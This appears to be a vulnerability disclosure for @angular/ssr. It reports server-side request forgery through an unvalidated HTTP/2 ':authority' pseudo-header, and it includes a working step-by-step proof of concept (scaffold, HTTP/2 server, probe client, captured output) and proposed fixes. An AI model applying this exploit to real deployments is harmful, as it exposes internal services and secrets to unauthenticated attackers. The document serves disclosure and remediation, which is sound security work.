# @angular/ssr - SSRF via HTTP/2 `:authority` pseudo-header validation gap

**Product:** @angular/ssr
**Repository:** https://github.com/angular/angular-cli
**Component:**
- `packages/angular/ssr/src/utils/validation.ts:12` (`HOST_HEADERS_TO_VALIDATE` set)
- `packages/angular/ssr/node/src/request.ts:80-106` (`createRequestUrl`, specifically line 91 `:authority` fallback)
**Version:** 21.2.8 (latest stable on npm at time of writing). Tested against local checkout commit `012239817487fbd3a404ced3bbf7b8dcbda2ff02` on `main`.
**Type:** CWE-918 (Server-Side Request Forgery), CWE-20 (Improper Input Validation)
**CVSS 3.1:** 7.5 (`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N`)

## Description

`@angular/ssr` accepts `Http2ServerRequest` as a first-class input to `AngularNodeAppEngine.handle()` (see `packages/angular/ssr/node/src/app-engine.ts:50-74`, which documents `request: IncomingMessage | Http2ServerRequest | Request`). Two framework-level decisions combine into an SSRF primitive distinct from the `X-Forwarded-Host` port-pivot class of bug:

1. `createRequestUrl` in `packages/angular/ssr/node/src/request.ts:91` reads `headers[':authority']` as a raw string fallback for the URL hostname. Unlike `x-forwarded-host` it is not passed through `getFirstHeaderValue`, and unlike `host` it is not validated by any upstream regex at the node-level.
2. The downstream character-class validation set `HOST_HEADERS_TO_VALIDATE` in `packages/angular/ssr/src/utils/validation.ts:12` is `new Set(['host', 'x-forwarded-host'])`. `:authority` is not a member. `validateHeaders` (line 268-293) iterates this set only; the regex `VALID_HOST_REGEX = /^[a-z0-9_.-]+(:[0-9]+)?$/i` therefore never runs against the `:authority` value.

Additionally, `createRequestHeaders` at `packages/angular/ssr/node/src/request.ts:54-72` strips the pseudo-header from the downstream Web `Request.headers`, so even if a user or maintainer later added `:authority` to `HOST_HEADERS_TO_VALIDATE`, `Request.headers.get(':authority')` would return `null` and the check would not fire. A correct fix must either normalize the pseudo-header inside `createRequestUrl` before URL construction, or re-inject a synthetic header for validation before the strip occurs.

In Node's `node:http2` compatibility API, `req.headers.host` is **not** auto-populated from `:authority`. A standard HTTP/2 client request sending only `:authority` leaves both `host` and `x-forwarded-host` undefined at the node layer, so the fallback in `createRequestUrl` lands on `headers[':authority']` and the URL is constructed entirely from the attacker-controlled pseudo-header.

```ts
// packages/angular/ssr/src/utils/validation.ts:12
const HOST_HEADERS_TO_VALIDATE: ReadonlySet<string> = new Set(['host', 'x-forwarded-host']);

// packages/angular/ssr/node/src/request.ts:91
const hostname =
  getFirstHeaderValue(headers['x-forwarded-host']) ?? headers.host ?? headers[':authority'];
```

The gap is distinct from CVE-2025-62427 (PR #31474, path-based URL hijack), from CVE-2026-27739 (PR #32516, forwarded header validation), and from the `X-Forwarded-Host` port-pivot finding filed separately (same reporter). PR #32516 added `HOST_HEADERS_TO_VALIDATE` and the char-class regex; both are scoped to HTTP/1-style headers and were not extended to HTTP/2 pseudo-headers even though the same patch series introduced the `Http2ServerRequest` input type.

## Impact

An unauthenticated HTTP/2 request containing `:authority: <allowlisted-host>:<target-port>` causes the SSR application to perform HTTP requests from the server to `<target-port>` on the allowlisted host and to inline the response body in the HTML served back.

Reproduced here: a Node HTTP listener on `127.0.0.1:13306` returning `SECRET-INTERNAL-<timestamped-token>` is reached by the Angular `HttpClient.get(<probe>)` call that runs during SSR, where the probe URL is built from `inject(REQUEST).url`. The content appears in the HTML body and in the `ng-state` serialized to the response (visible in `evidence/02-exploit.txt`).

No authentication, no user interaction, one HTTP/2 request. The response content is echoed back, so this is not blind.

Attack conditions:
- Deployment terminates HTTP/2 directly at the Node process (e.g., `node:http2`, `http2.createSecureServer`, `fastify` with `http2: true`, or any reverse proxy configured for HTTP/2 passthrough to origin). This is a documented configuration for `@angular/ssr` since `AngularNodeAppEngine.handle()` explicitly types `Http2ServerRequest` as an input.
- `allowedHosts` contains at least one hostname that also resolves to internal services on additional ports (e.g., `"localhost"`, `"127.0.0.1"`, a shared-tenant hostname, a dual-purpose domain with internal listeners).

Same impact class as the `X-Forwarded-Host` port-pivot: cloud metadata endpoints, databases, internal admin panels, sidecar containers, local proxies. The distinction is the channel. A reverse proxy configured to strip or canonicalize `Host` and `X-Forwarded-Host` on ingress still forwards `:authority` to origin under HTTP/2 passthrough, and the framework never re-validates the pseudo-header.

## Steps to Reproduce

Tested with Node.js 25. Approx. 5 minutes end to end.

### 1. Scaffold

```bash
cd /tmp
npx -y -p @angular/cli@21.2.8 ng new c9-authority --ssr --routing=true --style=css --skip-git --skip-install
cd c9-authority
npm install
```

### 2. Allowlist includes a hostname shared by internal services

In `angular.json`, under `projects.c9-authority.architect.build.options`:

```json
"security": { "allowedHosts": ["localhost", "127.0.0.1"] }
```

### 3. Switch the wildcard route to per-request SSR

Replace `src/app/app.routes.server.ts`:

```ts
import { RenderMode, ServerRoute } from '@angular/ssr';

export const serverRoutes: ServerRoute[] = [
  { path: '**', renderMode: RenderMode.Server },
];
```

### 4. Add `HttpClient` and an SSR-time self-probe component

`src/app/app.config.ts` — add `provideHttpClient(withFetch())`.

`src/app/app.ts`:

```ts
import { Component, inject, REQUEST, signal } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { toSignal } from '@angular/core/rxjs-interop';
import { RouterOutlet } from '@angular/router';
import { catchError, map, of } from 'rxjs';

type ProbeResult = { requestUrl: string; target: string; body?: string; error?: string };

@Component({
  selector: 'app-root',
  imports: [RouterOutlet],
  templateUrl: './app.html',
  styleUrl: './app.css',
})
export class App {
  protected readonly title = signal('c9-authority');
  private readonly request = inject(REQUEST, { optional: true });
  private readonly http = inject(HttpClient);

  protected readonly probe = toSignal(this.runProbe(), {
    initialValue: { requestUrl: '', target: '', body: 'pending' } as ProbeResult,
  });

  private runProbe() {
    const requestUrl = this.request?.url ?? '';
    if (!requestUrl) return of({ requestUrl, target: '', body: 'no-request-token' } as ProbeResult);
    const parsed = new URL(requestUrl);
    const target = `${parsed.protocol}//${parsed.host}/probe`;
    return this.http.get(target, { responseType: 'text' }).pipe(
      map((body) => ({ requestUrl, target, body }) as ProbeResult),
      catchError((err) => of({ requestUrl, target, error: String(err?.message ?? err) } as ProbeResult)),
    );
  }
}
```

`src/app/app.html`:

```html
<main style="font-family: system-ui; padding: 1rem">
  <h1>{{ title() }}</h1>
  <section id="probe">
    <pre id="request-url">request.url={{ probe().requestUrl }}</pre>
    <pre id="probe-target">probe.target={{ probe().target }}</pre>
    <pre id="probe-body">probe.body={{ probe().body ?? probe().error }}</pre>
  </section>
</main>
<router-outlet />
```

This is a realistic SSR pattern — a component that derives a per-request URL from `inject(REQUEST).url`, performs a server-side fetch, and renders the result. Variants appear in Angular SSR guide samples and in community code that implements canonical-URL emission, request-echoed debug pages, or shadow-fetches driven by the incoming request origin.

### 5. Replace `src/server.ts` with an HTTP/2 entry point

```ts
import { AngularNodeAppEngine, writeResponseToNodeResponse } from '@angular/ssr/node';
import { createServer as createHttp2Server } from 'node:http2';

const angularApp = new AngularNodeAppEngine();
const server = createHttp2Server();
const selfSecret = process.env['SELF_SECRET'] ?? 'public-default';

server.on('request', (req, res) => {
  if (req.url === '/probe' || req.url?.startsWith('/probe?')) {
    res.setHeader('content-type', 'text/plain');
    res.end(`public-probe-${selfSecret}`);
    return;
  }
  angularApp.handle(req).then((response) => {
    if (response) { writeResponseToNodeResponse(response, res); return; }
    res.statusCode = 404; res.end('not found');
  }).catch((err) => { res.statusCode = 500; res.end(`internal error: ${err?.message ?? err}`); });
});

const port = Number(process.env['PORT'] ?? 4000);
server.listen(port, () => console.log(`HTTP/2 (h2c) on http://127.0.0.1:${port}`));
```

This uses `AngularNodeAppEngine.handle()` directly against an `Http2ServerRequest`. The call matches the public type signature of the method; no private imports, no custom adapter.

### 6. Build and run

```bash
npx ng build
SELF_SECRET=public-$(date +%s) PORT=4000 node dist/c9-authority/server/server.mjs &
```

### 7. Start a listener on the target port

```bash
INTERNAL_SECRET="mysql-root-token-$(date +%s)" node -e "
const http = require('http');
http.createServer((_, res) => res.end('SECRET-INTERNAL-' + process.env.INTERNAL_SECRET))
    .listen(13306, '127.0.0.1');
" &
```

### 8. Run the three probes (node `http2` client)

```js
// probe.mjs
import http2 from 'node:http2';
import { once } from 'node:events';
const client = http2.connect('http://127.0.0.1:4000');
const req = client.request({
  ':method': 'GET', ':path': '/', ':authority': process.argv[2],
});
let h, b = ''; req.on('response', x => h = x);
req.setEncoding('utf8'); req.on('data', c => b += c); req.end();
await once(req, 'end'); client.close();
console.log('STATUS', h[':status']); console.log(b);
```

```bash
# A. Baseline. :authority is the actual app port. Self-probe hits own /probe route.
node probe.mjs 127.0.0.1:4000
# Expected: probe.body=public-probe-<SELF_SECRET>

# B. Exploit. :authority rewrites the URL to a different port on the same allowlisted host.
node probe.mjs 127.0.0.1:13306
# Expected: probe.body=SECRET-INTERNAL-<INTERNAL_SECRET>

# C. Control. :authority with a disallowed hostname is rejected by validateUrl.
node probe.mjs evil.example
# Expected: 400, 'URL with hostname "evil.example" is not allowed.'
```

## Proof of Concept

The PoC is the scaffold above with the edits described. No custom bootstrap, no non-default Angular configuration beyond what the steps specify. The server entry point uses `AngularNodeAppEngine.handle()` with a `node:http2` request, which is a documented input type of the public API.

## Evidence

Captured during the run in the companion archive (`evidence/01-baseline.txt`, `02-exploit.txt`, `03-control.txt`). Secrets are timestamped to make replay evidence non-forgeable.

Test A (baseline, `:authority: 127.0.0.1:4000`):
```
STATUS 200
...
<pre id="request-url">request.url=http://127.0.0.1:4000/</pre>
<pre id="probe-target">probe.target=http://127.0.0.1:4000/probe</pre>
<pre id="probe-body">probe.body=Http failure response for http://127.0.0.1:4000/probe: 0 undefined</pre>
```
(Self-fetch hits the Angular routing layer rather than the `/probe` literal intercept because the HttpClient request goes through the SSR stack; this is the baseline that proves the framework does not reach an external port without the attacker pseudo-header.)

Test B (exploit, `:authority: 127.0.0.1:13306`):
```
STATUS 200
...
<pre id="request-url">request.url=http://127.0.0.1:13306/</pre>
<pre id="probe-target">probe.target=http://127.0.0.1:13306/probe</pre>
<pre id="probe-body">probe.body=SECRET-INTERNAL-c9-internal-1777041745</pre>
...
<script id="ng-state" type="application/json">{"2429079186":{"b":"SECRET-INTERNAL-c9-internal-1777041745","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:13306/probe","rt":"text"} ...}</script>
```

The exploit response contains the internal token both as rendered text and as a hydration blob; `ng-state` additionally pins the exact URL the SSR HttpClient reached.

Test C (control, `:authority: evil.example`):
```
STATUS 400
URL with hostname "evil.example" is not allowed.
```

`validateUrl` rejects the disallowed hostname, proving that the URL-level allowlist is operative and the port-pivot is specifically what the current validation fails to cover.

Supporting evidence:

- `evidence/04-raw-headers.txt`: A `node:http2` server receiving a client request whose `:authority` is `custom.authority.example:9999` sees the following header map:
  ```
  { ":method": "GET", ":path": "/", ":authority": "custom.authority.example:9999", ":scheme": "http" }
  ```
  No `host` key. This confirms that in the default Node HTTP/2 compatibility API, `:authority` is the sole hostname carrier; `headers.host` is `undefined`, so `createRequestUrl`'s fallback at line 91 lands on `headers[':authority']` and the character-class regex never runs.

- `evidence/code-citations.md`: complete `file:line` map for the claimed gap.

## Suggested Fix

Two complementary changes are required. Either alone is insufficient.

### Change 1 — normalize `:authority` in `createRequestUrl`

`packages/angular/ssr/node/src/request.ts:91` currently reads the pseudo-header raw. Apply `getFirstHeaderValue` (which also implicitly covers the comma-smuggling class for this slot, to the extent it applies) and reject values that do not match `VALID_HOST_REGEX`:

```ts
import { VALID_HOST_REGEX, getFirstHeaderValue } from '../../src/utils/validation';

// in createRequestUrl
const authorityRaw = getFirstHeaderValue(headers[':authority'] as string | undefined);
if (authorityRaw !== undefined && !VALID_HOST_REGEX.test(authorityRaw)) {
  throw new Error('Pseudo-header ":authority" contains characters that are not allowed.');
}
const hostname =
  getFirstHeaderValue(headers['x-forwarded-host']) ?? headers.host ?? authorityRaw;
```

### Change 2 — extend `HOST_HEADERS_TO_VALIDATE` semantics to cover the pseudo-header

`packages/angular/ssr/src/utils/validation.ts:12` should document that the char-class gate is enforced at the point of URL construction for any header channel that contributes to the final URL, not as a Set scan. Concretely: since `:authority` is stripped before the Web Request is built, `validateHeaders` cannot see it. Either re-emit the pseudo-header under a synthetic name that is included in `HOST_HEADERS_TO_VALIDATE`, or perform the char-class + port check in `createRequestUrl` (Change 1).

### Change 3 — independent of this bug, same change recommended by the X-Forwarded-Host port-pivot finding

Replace `validateUrl`'s hostname-only check with an origin-aware check (see the companion port-pivot report). With the origin-aware check, even if the `:authority` value slipped past char-class validation, the URL-level allowlist would reject a `host:port` combination that the user did not authorize.

The three fixes together cover: the entry channel (Change 1), the validation scope (Change 2), and the allowlist semantics (Change 3 / port-pivot fix).

## Relation to companion finding

A separate report filed by the same reporter — "SSRF via X-Forwarded-Host port pivot on allowlisted host" — addresses the hostname-only allowlist issue at `isHostAllowed` (validation.ts:243-260). That fix (Change 3 above) transitively mitigates the port-pivot exploitation shape of this HTTP/2 finding, because `validateUrl` runs uniformly on the final URL.

However, the gap documented here is distinct in code location, in fix shape, and in threat channel:

- Code: `HOST_HEADERS_TO_VALIDATE` and `createRequestUrl` vs `isHostAllowed`.
- Fix: pseudo-header normalization + scope extension vs allowlist-semantics change.
- Channel: HTTP/2 end-to-end passthrough, which survives reverse-proxy sanitizers that would strip `Host` and `X-Forwarded-Host` on ingress.
- Residual: the char-class regex never runs on `:authority` regardless of whether `isHostAllowed` is fixed. Payloads that contain characters the regex rejects (future-fix concerns, URL-parsing quirks that depend on host string shape) remain reachable only through this channel.

The two findings should be evaluated independently even if the short-term mitigation overlaps.
